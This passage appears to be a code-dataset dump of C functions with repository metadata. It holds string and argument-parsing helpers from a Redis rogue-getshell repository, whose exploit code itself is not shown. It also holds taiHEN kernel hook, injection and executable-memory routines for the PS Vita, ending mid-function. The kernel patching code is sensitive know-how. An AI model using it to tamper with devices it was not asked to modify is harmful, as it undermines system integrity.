"RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Modify an sds string in-place to make it empty (zero length).\n * However all the existing buffer is not discarded but set as free space\n * so that next append operations will not require allocations up to the\n * number of bytes previously available. */\n", "func_signal": "void sdsclear(sds s)", "code": "{\n    sdssetlen(s, 0);\n    s[0] = '\\0';\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/**\nCheck if an argument exists in an argument list (argv,argc), starting at offset.\n@return 0 if it doesn't exist, otherwise the offset it exists in\n*/\n", "func_signal": "int RMUtil_ArgExists(const char *arg, RedisModuleString **argv, int argc, int offset)", "code": "{\n\n  size_t larg = strlen(arg);\n  for (; offset < argc; offset++) {\n    size_t l;\n    const char *carg = RedisModule_StringPtrLen(argv[offset], &l);\n    if (l != larg) continue;\n    if (carg != NULL && strncasecmp(carg, arg, larg) == 0) {\n      return offset;\n    }\n  }\n  return 0;\n}", "path": "RedisModulesSDK\\rmutil\\util.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "// Internal function that parses arguments based on the format described above\n", "func_signal": "int rmutil_vparseArgs(RedisModuleString **argv, int argc, int offset, const char *fmt, va_list ap)", "code": "{\n\n  int i = offset;\n  char *c = (char *)fmt;\n  while (*c && i < argc) {\n\n    // read c string\n    if (*c == 'c') {\n      char **p = va_arg(ap, char **);\n      *p = (char *)RedisModule_StringPtrLen(argv[i], NULL);\n    } else if (*c == 'b') {\n      char **p = va_arg(ap, char **);\n      size_t *len = va_arg(ap, size_t *);\n      *p = (char *)RedisModule_StringPtrLen(argv[i], len);\n    } else if (*c == 's') {  // read redis string\n\n      RedisModuleString **s = va_arg(ap, void *);\n      *s = argv[i];\n\n    } else if (*c == 'l') {  // read long\n      long long *l = va_arg(ap, long long *);\n\n      if (RedisModule_StringToLongLong(argv[i], l) != REDISMODULE_OK) {\n        return REDISMODULE_ERR;\n      }\n    } else if (*c == 'd') {  // read double\n      double *d = va_arg(ap, double *);\n      if (RedisModule_StringToDouble(argv[i], d) != REDISMODULE_OK) {\n        return REDISMODULE_ERR;\n      }\n    } else if (*c == '*') {  // skip current arg\n      // do nothing\n    } else {\n      return REDISMODULE_ERR;  // WAT?\n    }\n    c++;\n    i++;\n  }\n  // if the format is longer than argc, retun an error\n  if (*c != 0) {\n    return REDISMODULE_ERR;\n  }\n  return REDISMODULE_OK;\n}", "path": "RedisModulesSDK\\rmutil\\util.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Destructively modify the sds string 's' to hold the specified binary\n * safe string pointed by 't' of length 'len' bytes. */\n", "func_signal": "sds sdscpylen(sds s, const char *t, size_t len)", "code": "{\n    if (sdsalloc(s) < len) {\n        s = sdsMakeRoomFor(s,len-sdslen(s));\n        if (s == NULL) return NULL;\n    }\n    memcpy(s, t, len);\n    s[len] = '\\0';\n    sdssetlen(s, len);\n    return s;\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Helper function for sdssplitargs() that converts a hex digit into an\n * integer from 0 to 15 */\n", "func_signal": "int hex_digit_to_int(char c)", "code": "{\n    switch(c) {\n    case '0': return 0;\n    case '1': return 1;\n    case '2': return 2;\n    case '3': return 3;\n    case '4': return 4;\n    case '5': return 5;\n    case '6': return 6;\n    case '7': return 7;\n    case '8': return 8;\n    case '9': return 9;\n    case 'a': case 'A': return 10;\n    case 'b': case 'B': return 11;\n    case 'c': case 'C': return 12;\n    case 'd': case 'D': return 13;\n    case 'e': case 'E': return 14;\n    case 'f': case 'F': return 15;\n    default: return 0;\n    }\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Create a new sds string starting from a null terminated C string. */\n", "func_signal": "sds sdsnew(const char *init)", "code": "{\n    size_t initlen = (init == NULL) ? 0 : strlen(init);\n    return sdsnewlen(init, initlen);\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Create an sds string from a long long value. It is much faster than:\n *\n * sdscatprintf(sdsempty(),\"%lld\\n\", value);\n */\n", "func_signal": "sds sdsfromlonglong(long long value)", "code": "{\n    char buf[SDS_LLSTR_SIZE];\n    int len = sdsll2str(buf,value);\n\n    return sdsnewlen(buf,len);\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Apply toupper() to every character of the sds string 's'. */\n", "func_signal": "void sdstoupper(sds s)", "code": "{\n    int len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = toupper(s[j]);\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/* Increment the sds length and decrements the left free space at the\n * end of the string according to 'incr'. Also set the null term\n * in the new end of the string.\n *\n * This function is used in order to fix the string length after the\n * user calls sdsMakeRoomFor(), writes something after the end of\n * the current string, and finally needs to set the new length.\n *\n * Note: it is possible to use a negative increment in order to\n * right-trim the string.\n *\n * Usage example:\n *\n * Using sdsIncrLen() and sdsMakeRoomFor() it is possible to mount the\n * following schema, to cat bytes coming from the kernel to the end of an\n * sds string without copying into an intermediate buffer:\n *\n * oldlen = sdslen(s);\n * s = sdsMakeRoomFor(s, BUFFER_SIZE);\n * nread = read(fd, s+oldlen, BUFFER_SIZE);\n * ... check for nread <= 0 and handle it ...\n * sdsIncrLen(s, nread);\n */\n", "func_signal": "void sdsIncrLen(sds s, int incr)", "code": "{\n    unsigned char flags = s[-1];\n    size_t len;\n    switch(flags&SDS_TYPE_MASK) {\n        case SDS_TYPE_5: {\n            unsigned char *fp = ((unsigned char*)s)-1;\n            unsigned char oldlen = SDS_TYPE_5_LEN(flags);\n            assert((incr > 0 && oldlen+incr < 32) || (incr < 0 && oldlen >= (unsigned int)(-incr)));\n            *fp = SDS_TYPE_5 | ((oldlen+incr) << SDS_TYPE_BITS);\n            len = oldlen+incr;\n            break;\n        }\n        case SDS_TYPE_8: {\n            SDS_HDR_VAR(8,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_16: {\n            SDS_HDR_VAR(16,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_32: {\n            SDS_HDR_VAR(32,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (unsigned int)incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_64: {\n            SDS_HDR_VAR(64,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (uint64_t)incr) || (incr < 0 && sh->len >= (uint64_t)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        default: len = 0; /* Just to avoid compilation warnings. */\n    }\n    s[len] = '\\0';\n}", "path": "RedisModulesSDK\\rmutil\\sds.c", "repo_name": "vulhub/redis-rogue-getshell", "stars": 282, "license": "apache-2.0", "language": "c", "size": 194}
{"docstring": "/**\n * @brief      Test injections\n *\n * @param[in]  name    The name of the test\n * @param[in]  flavor  The flavor of the test\n *\n * @return     Success\n */\n", "func_signal": "int test_scenario_2(const char *name, int flavor)", "code": "{\n  int i, j, ret;\n  int ordering[TEST_2_NUM_INJECT];\n  size_t offset;\n  tai_module_info_t info;\n  permute_index(flavor, TEST_2_NUM_INJECT+1, ordering);\n  info.size = sizeof(info);\n  ret = taiGetModuleInfoForKernel(KERNEL_PID, \"SceIofilemgr\", &info);\n  TEST_MSG(\"taiGetModuleInfoForKernel: %x\", ret);\n  if (ret < 0) {\n    return ret;\n  }\n  for (j = 0; j < TEST_2_NUM_INJECT; j++) {\n    i = ordering[j];\n    if (i % 2 == 1) {\n      offset = IOFILEMGR_OFFSET_SCEIOOPENFORDRIVER;\n    } else {\n      offset = IOFILEMGR_OFFSET_JUNK + i;\n    }\n    TEST_MSG(\"adding injection %d\", i);\n    g_inj_refs[i] = taiInjectDataForKernel(KERNEL_PID, info.modid, 0, offset, &bxlr, 2);\n    TEST_MSG(\"offset: %x, ret: %x\", offset, g_inj_refs[i]);\n    if (g_inj_refs[i] < 0) {\n      if (g_inj_refs[i] == TAI_ERROR_PATCH_EXISTS) {\n        g_inj_refs[i] = 0;\n        TEST_MSG(\"existing patch, skipping %d\", i);\n      } else {\n        return g_inj_refs[i];\n      }\n    }\n  }\n  return 0;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Scenario 2\n *\n *             This test places some fixed blocks and then randomizes the order\n *             of the remaining blocks. It then tries to add each one and then\n *             removes each one.\n *\n * @param[in]  name  The name of the test\n * @param      map   The map\n * @param[in]  pid   The pid\n *\n * @return     Success\n */\n", "func_signal": "int test_scenario_2(const char *name, tai_proc_map_t *map, SceUID pid)", "code": "{\n  tai_patch_t *fixed[TEST_2_NUM_FIXED];\n  tai_patch_t *scramble[TEST_2_NUM_SCRAMBLE];\n  tai_patch_t *current;\n  tai_patch_t *actual;\n  int ordering[TEST_2_NUM_SCRAMBLE];\n  int success;\n\n  fixed[0] = create_patch(pid, 0x100, 0x50); // block 1\n  fixed[1] = create_patch(pid, 0x200, 0x50); // block 2\n  scramble[0] = create_patch(pid, 0x50, 0x20); // no overlap before\n  scramble[1] = create_patch(pid, 0xf0, 0x20); // overlap tail <-> head\n  scramble[2] = create_patch(pid, 0x120, 0x20); // complete overlap\n  scramble[3] = create_patch(pid, 0x140, 0x20); // overlap head <-> tail\n  scramble[4] = create_patch(pid, 0x90, 0x200); // overlap two blocks\n  scramble[5] = create_patch(pid, 0x300, 0x100); // at the end\n  permute_index(TEST_2_NUM_SCRAMBLE+1, ordering);\n  for (int i = 0; i < TEST_2_NUM_FIXED; i++) {\n    TEST_MSG(\"Adding fixed block %d: addr:%lx, size:%zx\", i, fixed[i]->addr, fixed[i]->size);\n    success = proc_map_try_insert(map, fixed[i], &actual);\n    if (!success) {\n      TEST_MSG(\"Fixed block %d already exists.\", i);\n      free(fixed[i]);\n      fixed[i] = NULL;\n    }\n    if (VERBOSE) proc_map_dump(name, map, 1);\n  }\n  for (int i = 0; i < TEST_2_NUM_SCRAMBLE; i++) {\n    current = scramble[ordering[i]];\n    TEST_MSG(\"Adding block %d: addr:%lx, size:%zx\", i, current->addr, current->size);\n    if (proc_map_try_insert(map, current, &actual) != 1) {\n      assert(!actual || actual->pid == current->pid);\n      TEST_MSG(\"Block %d failed to insert.\", i);\n      free(current);\n      scramble[ordering[i]] = NULL;\n    } else {\n      TEST_MSG(\"Block %d inserted successfully.\", i);\n    }\n    if (VERBOSE) proc_map_dump(name, map, 1);\n  }\n  for (int i = 0; i < TEST_2_NUM_SCRAMBLE; i++) {\n    current = scramble[ordering[i]];\n    if (current) {\n      TEST_MSG(\"Removing block %d\", i);\n      success = proc_map_remove(map, current);\n      assert(success);\n      free(current);\n      scramble[ordering[i]] = NULL;\n      if (VERBOSE) proc_map_dump(name, map, 1);\n    }\n  }\n  for (int i = 0; i < TEST_2_NUM_FIXED; i++) {\n    if (fixed[i]) {\n      TEST_MSG(\"Removing fixed block %d\", i);\n      success = proc_map_remove(map, fixed[i]);\n      assert(success);\n      free(fixed[i]);\n      fixed[i] = NULL;\n      if (VERBOSE) proc_map_dump(name, map, 1);\n    }\n  }\n  return 0;\n}", "path": "tests\\test_proc_map.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Multi threaded tests\n *\n * @param[in]  type  The type, 0 = test_1, 1 = test_2\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "static int multi_threaded(int type)", "code": "{\n  const char *name = \"multi-thread\";\n  int i;\n  int ret;\n  SceUID threads[TEST_NUM_THREADS];\n  struct thread_args args[TEST_NUM_THREADS];\n\n  g_wait_lock = ksceKernelCreateMutex(\"wait\", 0, 0, NULL);\n  g_done_lock = ksceKernelCreateMutex(\"done\", 0, 0, NULL);\n\n  for (i = 0; i < TEST_NUM_THREADS; i++) {\n    threads[i] = ksceKernelCreateThread(\"test\", start_test, 64, 0x2000, 0, 0x10000, 0);\n    TEST_MSG(\"create thread %d: %x\", i, threads[i]);\n    ksceKernelGetRandomNumber(&args[i].flavor, sizeof(int));\n    args[i].prefix = type ? \"hook\" : \"inject\";\n    args[i].index = i;\n    args[i].flavor = (args[i].flavor << 1) | type;\n  }\n\n  g_done_count = 0;\n  ksceKernelLockMutex(g_wait_lock, 1, NULL);\n  for (i = 0; i < TEST_NUM_THREADS; i++) {\n    ret = ksceKernelStartThread(threads[i], sizeof(args[i]), &args[i]);\n    TEST_MSG(\"started thread %d: %x\", i, ret);\n  }\n\n  TEST_MSG(\"wait for threads to hit checkpoint\");\n  int done, last = 0;\n  while (1) {\n    ksceKernelLockMutex(g_done_lock, 1, NULL);\n    done = g_done_count;\n    ksceKernelUnlockMutex(g_done_lock, 1);\n    if (done != last) {\n      TEST_MSG(\"done: %d\", done);\n      last = done;\n    }\n    if (done == TEST_NUM_THREADS) {\n      break;\n    }\n  }\n  TEST_MSG(\"all threads done, testing hooks\");\n  if (type & 1) {\n    ret = test_scenario_1_test_hooks(name);\n  } else {\n    ret = test_scenario_2_test_inject(name);\n  }\n  TEST_MSG(\"starting cleanup phase\");\n  ksceKernelUnlockMutex(g_wait_lock, 1);\n\n  TEST_MSG(\"waiting for threads to complete\");\n  for (i = 0; i < TEST_NUM_THREADS; i++) {\n    if (ksceKernelWaitThreadEnd(threads[i], &ret, NULL) < 0) {\n      TEST_MSG(\"wait %d timed out\", i);\n    }\n    TEST_MSG(\"thread %d returned %x\", i, ret);\n    ksceKernelDeleteThread(threads[i]);\n  }\n\n  ksceKernelDeleteMutex(g_wait_lock);\n  ksceKernelDeleteMutex(g_done_lock);\n  return ret;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Free chunk of memory\n *\n * @param[in]  write_res  The writable UID\n * @param[in]  exe_res    The executable UID\n *\n * @return     Zero\n */\n", "func_signal": "static int sce_exe_free(SceUID write_res, SceUID exe_res)", "code": "{\n    LOG(\"freeing slab %x, mirror %x\", exe_res, write_res);\n    ksceKernelFreeMemBlock(write_res);\n    ksceKernelFreeMemBlock(exe_res);\n    return 0;\n}", "path": "slab.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Compute the next largest power of two. Limit 32 bits.\n *\n * @param[in]  v     Input number\n *\n * @return     Next power of 2.\n */\n", "func_signal": "static inline uint32_t next_pow_2(uint32_t v)", "code": "{\n    v--;\n    v |= v >> 1;\n    v |= v >> 2;\n    v |= v >> 4;\n    v |= v >> 8;\n    v |= v >> 16;\n    v++;\n    v += (v == 0);\n    return v;\n}", "path": "slab.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Print out the current proc map\n *\n * @param      map   The map\n * @param[in]  lock  If 1, then lock the map before dumping\n */\n", "func_signal": "void proc_map_dump(const char *name, tai_proc_map_t *map, int lock)", "code": "{\n  tai_proc_t *proc;\n  tai_patch_t *patch;\n\n  TEST_MSG(\"Dumping map...\");\n  if (lock) ksceKernelLockMutex(map->lock, 1, NULL);\n  for (int i = 0; i < map->nbuckets; i++) {\n    for (proc = map->buckets[i]; proc != NULL; proc = proc->next) {\n      TEST_MSG(\"Proc Item: pid = %d\", proc->pid);\n      for (patch = proc->head; patch != NULL; patch = patch->next) {\n        TEST_MSG(\"    Patch: pid = %d, addr = %lx, size = %zx\", patch->pid, patch->addr, patch->size);\n      }\n    }\n  }\n  TEST_MSG(\"Finished dumping map.\");\n  if (lock) ksceKernelUnlockMutex(map->lock, 1);\n}", "path": "tests\\test_proc_map.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Finds an integer in userspace.\n * \n * This only finds 4-byte aligned integers in the specified range!\n *\n * @param[in]  pid     The pid\n * @param[in]  src     The source\n * @param[in]  needle  The needle\n * @param[in]  size    The size\n *\n * @return     0 if not found or the offset to the needle\n */\n", "func_signal": "static int find_int_for_user(SceUID pid, uintptr_t src, uint32_t needle, size_t size)", "code": "{\n  int my_context[3];\n  int *other_context;\n  int flags;\n  uintptr_t end;\n  uint32_t data;\n  int count;\n  int ret;\n\n  count = 0;\n  end = (src + size) & ~3; // align to last 4 byte boundary\n  src = (src + 3) & ~3; // align to next 4 byte boundary\n  if (end <= src) {\n    return 0;\n  }\n  size = end-src;\n  flags = ksceKernelCpuDisableInterrupts();\n  ksceKernelCpuSaveContext(my_context);\n  ret = ksceKernelGetPidContext(pid, &other_context);\n  if (ret >= 0) {\n    ksceKernelCpuRestoreContext(other_context);\n    while (count < size) {\n      asm (\"ldrt %0, [%1]\" : \"=r\" (data) : \"r\" (src+count));\n      if (data == needle) {\n        break;\n      }\n      count += 4;\n    }\n  }\n  ksceKernelCpuRestoreContext(my_context);\n  ksceKernelCpuEnableInterrupts(flags);\n  if (ret < 0) {\n    LOG(\"Error trying to get context for %x\", pid);\n    count = ret;\n  }\n  if (count >= size) {\n    return -1;\n  } else {\n    return count;\n  }\n}", "path": "module.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Test that hooks are successful\n *\n * @param[in]  name  The name\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "int test_scenario_1_test_hooks(const char *name)", "code": "{\n  int ret, i;\n\n  ret = ksceIoOpen(\"ux0:bad\", 0, 0);\n  TEST_MSG(\"ksceIoOpen: %x\", ret);\n  for (i = 0; i < TEST_1_NUM_HOOKS; i++) {\n    if (!g_refs[i] || g_passed[i] > 0) {\n      TEST_MSG(\"HOOKS PASSED: %d, called: %d\", i, g_passed[i]);\n    } else {\n      TEST_MSG(\"HOOKS FAILED: %d, called: 0\", i);\n      return -1;\n    }\n  }\n  return 0;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Converts internal SCE structure to a usable form\n *\n *             This is needed since the internal SceKernelModulemgr structures\n *             change in different firmware versions.\n *\n * @param[in]  pid      The pid\n * @param[in]  sceinfo  Return from `ksceKernelGetModuleInternal`\n * @param[out] taiinfo  Output data structure\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "static int sce_to_tai_module_info(SceUID pid, void *sceinfo, tai_module_info_t *taiinfo)", "code": "{\n  SceKernelFwInfo fwinfo;\n  char *info;\n\n  if (fw_version == 0) {\n    fwinfo.size = sizeof(fwinfo);\n    if (ksceKernelGetSystemSwVersion(&fwinfo) < 0) {\n      fw_version = DEFAULT_FW_VERSION;\n    } else {\n      fw_version = fwinfo.version;\n    }\n    LOG(\"ksceKernelGetSystemSwVersion: 0x%08X\", fw_version);\n  }\n\n  if (taiinfo->size < sizeof(tai_module_info_t)) {\n    LOG(\"Structure size too small: %d\", taiinfo->size);\n    return TAI_ERROR_SYSTEM;\n  }\n\n  info = (char *)sceinfo;\n  if (fw_version >= 0x3600000) {\n    if (pid == KERNEL_PID) {\n      taiinfo->modid = *(SceUID *)(info + 0xC);\n    } else {\n      taiinfo->modid = *(SceUID *)(info + 0x10);\n    }\n    snprintf(taiinfo->name, 27, \"%s\", *(const char **)(info + 0x1C));\n    taiinfo->name[26] = '\\0';\n    taiinfo->module_nid = *(uint32_t *)(info + 0x30);\n    taiinfo->exports_start = *(uintptr_t *)(info + 0x20);\n    taiinfo->exports_end = *(uintptr_t *)(info + 0x24);\n    taiinfo->imports_start = *(uintptr_t *)(info + 0x28);\n    taiinfo->imports_end = *(uintptr_t *)(info + 0x2C);\n  } else if (fw_version >= 0x1692000) {\n    if (pid == KERNEL_PID) {\n      taiinfo->modid = *(SceUID *)(info + 0x0);\n    } else {\n      taiinfo->modid = *(SceUID *)(info + 0x4);\n    }\n    taiinfo->module_nid = *(uint32_t *)(info + 0x3C);\n    snprintf(taiinfo->name, 27, \"%s\", (const char *)(info + 0xC));\n    taiinfo->name[26] = '\\0';\n    taiinfo->exports_start = *(uintptr_t *)(info + 0x2C);\n    taiinfo->exports_end = *(uintptr_t *)(info + 0x30);\n    taiinfo->imports_start = *(uintptr_t *)(info + 0x34);\n    taiinfo->imports_end = *(uintptr_t *)(info + 0x38);\n  } else {\n    LOG(\"Unsupported FW 0x%08X\", fw_version);\n    return TAI_ERROR_SYSTEM;\n  }\n  return TAI_SUCCESS;\n}", "path": "module.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Test freeing injections\n *\n * @param[in]  name    The name of the test\n * @param[in]  flavor  The flavor of the test\n *\n * @return     Success\n */\n", "func_signal": "int test_scenario_2_cleanup(const char *name, int flavor)", "code": "{\n  int ret;\n  int i, j;\n  int ordering[TEST_2_NUM_INJECT];\n  permute_index(flavor / 2, TEST_2_NUM_INJECT+1, ordering);\n  for (j = 0; j < TEST_2_NUM_INJECT; j++) {\n    i = ordering[j];\n    if (g_inj_refs[i] > 0) {\n      TEST_MSG(\"removing injection %d\", i);\n      ret = taiInjectReleaseForKernel(g_inj_refs[i]);\n      TEST_MSG(\"release %d: %x\", i, ret);\n      g_inj_refs[i] = 0;\n    } else {\n      TEST_MSG(\"skipping %d\", i);\n    }\n  }\n  return 0;\n}", "path": "tests\\test_api_kernel.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Gets an imported function stub address\n *\n * @param[in]  pid            The pid\n * @param[in]  modname        The name of the module importing the function\n * @param[in]  target_libnid  The target's library NID. Can be `TAI_ANY_LIBRARY`\n * @param[in]  funcnid        The target's function NID\n * @param[out] stub           Output address to stub calling the imported\n *                            function\n *\n * @return     Zero on success, < 0 on error\n */\n", "func_signal": "int module_get_import_func(SceUID pid, const char *modname, uint32_t target_libnid, uint32_t funcnid, uintptr_t *stub)", "code": "{\n  sce_module_imports_t local;\n  tai_module_info_t info;\n  sce_module_imports_t *import;\n  uintptr_t cur;\n  int found;\n  int i;\n  int ret;\n\n  LOG(\"Getting import for pid:%x, modname:%s, target_libnid:%x, funcnid:%x\", pid, modname, target_libnid, funcnid);\n  info.size = sizeof(info);\n  if (module_get_by_name_nid(pid, modname, TAI_IGNORE_MODULE_NID, &info) < 0) {\n    LOG(\"Failed to find module: %s\", modname);\n    return TAI_ERROR_NOT_FOUND;\n  }\n\n  for (cur = info.imports_start; cur < info.imports_end; ) {\n    if (pid == KERNEL_PID) {\n      import = (sce_module_imports_t *)cur;\n    } else {\n      if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, &local.size, cur, sizeof(local.size))) < 0) {\n        LOG(\"Error trying to read address %p for %x: %x\", cur, pid, ret);\n        return ret;\n      }\n      if (local.size <= sizeof(local)) {\n        if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, &local, cur, local.size)) < 0) {\n          LOG(\"Error trying to read address %p for %x: %x\", cur, pid, ret);\n          return ret;\n        }\n      }\n      import = &local;\n    }\n\n    //LOG(\"import size is 0x%04X\", import->size);\n    if (import->size == sizeof(struct sce_module_imports_1)) {\n      if (target_libnid == TAI_ANY_LIBRARY || import->type1.lib_nid == target_libnid) {\n        if (pid == KERNEL_PID) {\n          for (i = 0; i < import->type1.num_functions; i++) {\n            if (import->type1.func_nid_table[i] == funcnid) {\n              *stub = (uintptr_t)import->type1.func_entry_table[i];\n              LOG(\"found kernel address: 0x%08X\", *stub);\n              return TAI_SUCCESS;\n            }\n          }\n        } else {\n          found = find_int_for_user(pid, (uintptr_t)import->type1.func_nid_table, funcnid, import->type1.num_functions * 4);\n          if (found >= 0) {\n            if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, stub, (uintptr_t)import->type1.func_entry_table + found, 4)) < 0) {\n              LOG(\"Error trying to read address %p for %x: %x\", (uintptr_t)import->type1.func_entry_table + found, pid, ret);\n              return ret;\n            }\n            LOG(\"found user address: 0x%08X\", *stub);\n            return TAI_SUCCESS;\n          }\n        }\n      }\n    } else if (import->size == sizeof(struct sce_module_imports_2)) {\n      if (target_libnid == TAI_ANY_LIBRARY || import->type2.lib_nid == target_libnid) {\n        if (pid == KERNEL_PID) {\n          for (i = 0; i < import->type2.num_functions; i++) {\n            if (import->type2.func_nid_table[i] == funcnid) {\n              *stub = (uintptr_t)import->type2.func_entry_table[i];\n              LOG(\"found kernel address: 0x%08X\", *stub);\n              return TAI_SUCCESS;\n            }\n          }\n        } else {\n          found = find_int_for_user(pid, (uintptr_t)import->type2.func_nid_table, funcnid, import->type2.num_functions * 4);\n          if (found >= 0) {\n            if ((ret = ksceKernelMemcpyUserToKernelForPid(pid, stub, (uintptr_t)import->type2.func_entry_table + found, 4)) < 0) {\n              LOG(\"Error trying to read address %p for %x: %x\", (uintptr_t)import->type2.func_entry_table + found, pid, ret);\n              return ret;\n            }\n            LOG(\"found user address: 0x%08X\", *stub);\n            return TAI_SUCCESS;\n          }\n        }\n      }\n    } else {\n      LOG(\"Invalid import size: %d\", import->size);\n    }\n    cur += import->size;\n  }\n\n  return TAI_ERROR_NOT_FOUND;\n}", "path": "module.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Scenario 1\n * \n * This test basically tries to insert 5 non-overlapping regions for a PID and \n * then remove all items for a PID. It is expected that the test is run from \n * multiple threads for best coverage.\n *\n * @param[in]  name  The name\n * @param      map   The map\n * @param[in]  pid   The pid\n *\n * @return     Success. Errors will halt the test.\n */\n", "func_signal": "int test_scenario_1(const char *name, tai_proc_map_t *map, SceUID pid)", "code": "{\n  tai_patch_t *possible, *actual;\n  int ordering[TEST_1_NUM_BLOCKS];\n  int ret;\n\n  permute_index(TEST_1_NUM_BLOCKS+1, ordering);\n  for (int i = 0; i < TEST_1_NUM_BLOCKS; i++) {\n    possible = create_patch(pid, ordering[i] * 0x100, 0x100);\n    TEST_MSG(\"Inserting for %d addr:%lx, size:%zx\", pid, possible->addr, possible->size);\n    if (proc_map_try_insert(map, possible, &actual) != 1) {\n      assert(actual);\n      TEST_MSG(\"Already exist:%lx, size:%zx\", actual->addr, actual->size);\n      assert(actual->pid == possible->pid);\n      assert(actual->addr == possible->addr);\n      assert(actual->size == possible->size);\n      free(possible);\n    }\n    if (VERBOSE) proc_map_dump(name, map, 1);\n  }\n  TEST_MSG(\"Remove all for pid %d\", pid);\n  ret = proc_map_remove_all_pid(map, pid, &actual);\n  TEST_MSG(\"Result: %d\", ret);\n  if (VERBOSE) proc_map_dump(name, map, 1);\n  if (ret) { // only ONE thread should return 1\n    tai_patch_t *next;\n    uintptr_t last_addr = 0;\n    while (actual != NULL) {\n      TEST_MSG(\"Removed block: addr:%lx, size:%zx\", actual->addr, actual->size);\n      assert(last_addr <= actual->addr);\n      assert(actual->size == 0x100);\n      assert(actual->pid == pid);\n      next = actual->next;\n      free(actual);\n      actual = next;\n    }\n  }\n  return 0;\n}", "path": "tests\\test_proc_map.c", "repo_name": "yifanlu/taiHEN", "stars": 279, "license": "mit", "language": "c", "size": 764}
{"docstring": "/**\n * @brief      Allocates a raw chunk of memory\n *\n * Returns a pointer that's kernel writable and another one that's executable.\n *\n * @param[in]  pid       PID to allocate memory for\n * @param      ptr       A kernel writable pointer\n * @param      exe_addr  Executable in the address spaces of PID process\n * @param      exe_res   UID for the executable mapping\n * @param[in]  align     Alignment\n * @param[in]  size      Size\n *\n * @return     UID of writable memory on success, < 0 on error\n */\n", "func_signal": "static SceUID sce_exe_alloc(SceUID pid, void **ptr, uintptr_t *exe_addr, SceUID *exe_res, size_t align, size_t size)", "code": "{\n    SceKernelAllocMemBlockKernelOpt opt;\n    SceKernelMemBlockType type;\n    SceUID res, blkid;\n\n    LOG(\"Allocating exec slab for %x size 0x%08X\", pid, size);\n    // allocate exe mem\n    memset(&opt, 0, sizeof(opt));\n    opt.size = sizeof(opt);\n    opt.attr = 0xA0000000 | 0x400000;\n    opt.alignment = align;\n    if (align) {\n        opt.attr |= SCE_KERNEL_ALLOC_MEMBLOCK_ATTR_HAS_ALIGNMENT;\n    }\n    if (pid == KERNEL_PID) {\n        type = SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX;\n    } else if (pid == SHARED_PID) {\n        type = SCE_KERNEL_MEMBLOCK_TYPE_SHARED_RX;\n    } else {\n        type = SCE_KERNEL_MEMBLOCK_TYPE_USER_RX;\n        opt.attr |= 0x80080;\n        opt.pid = pid;\n    }\n    *exe_res = ksceKernelAllocMemBlock(\"taislab\", type, size, &opt);\n    